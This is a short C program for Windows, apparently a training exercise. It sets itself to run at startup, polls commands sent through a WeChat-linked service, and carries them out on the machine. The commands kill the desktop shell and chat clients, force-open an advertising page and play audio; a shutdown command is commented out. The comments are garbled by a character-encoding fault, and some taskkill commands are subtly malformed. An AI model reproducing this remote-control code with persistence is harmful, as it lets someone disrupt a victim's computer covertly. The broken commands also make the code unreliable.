#include <stdio.h>
#include <windows.h>
#include "itmojun.h"

#pragma comment(lib,"itmojun.lib")
#pragma comment(lib,"winmm.lib")
int main()
{
	char cmd[301];//(��΢�Ŷ˽�����Ϣ)
	AutoRun();//����ǰ��������Ϊ�����Զ�����
	mciSendString("open bg.mp3 alias s",NULL,0,NULL);//��ָ�������ļ���ָ�������Ϊs 
	while(1)
	{
		//GetPCCmd�����Ĺ��ܣ���΢�Ŷ˽���һ����Ϣ�����û���κ���Ϣ����һֱ�ȴ�
		//��һ������Ϊ����ID,��ͬ���Խ���ʹ�ò�ͬ��ID
		//�ڶ�������Ϊ������Ϣ
	GetPCCmd("wyj",cmd);
	printf("%s\n",cmd);
	//strstr�����Ĺ��ܣ���һ���ַ����в����ַ���������ҵ��򷵻���ָ�룬���򷵻�NULL
	if(strstr(cmd,"�ػ�"))
	{
		//WinExec("shutdown -s -t 0",0)
	}
	else if(strstr(cmd,"����"))
	{
		//����
	    //WinExec("shutdown -s -t 0",0);
	}
	else if(strstr(cmd,"����"))
	{
		static int kill_flag=1;
		if(kill_flag)
		//�ɵ�����
	    WinExec("taskkill /f /im explorer.exe",0);
		else 
		//�ָ�����
	    WinExec("c:\\Windows\\explorer.exe",1);
		kill_flag=!kill_flag;
	}
	else if(strstr(cmd,"ɱ���"))
	{
		//�ɵ�QQ
		WinExec("taskkill /f im qq.exe",0);

	}
	else if(strstr(cmd,"����"))
	{
		WinExec("tackkill /f im client.exe",0);
	}
	else if(strstr(cmd,"���"))
	{//ǿ�ƴ򿪹��ҳ��
		WinExec("explorer https://itmojun.com",1);
	}
	else if(strstr(cmd,"���±�"))
	{//�򿪼��±�
	WinExec("notepad",1); 
	} 
	else if(strstr(cmd,"����"))
	{//���ű������� 

	mciSendString("play s repeat",NULL,0,NULL);//�ظ�����s 
	 
	} 
	else if(strstr(cmd,"��ͣ"))
	{//��ͣ�������� 

	mciSendString("pause s",NULL,0,NULL);
	 
	} 
		else if(strstr(cmd,"ֹͣ"))
	{//��ͣ�������� 

	mciSendString("stop s",NULL,0,NULL);
	 
	} 
	Sleep(3000);//��ʱ3��
	}
	return 0;
}
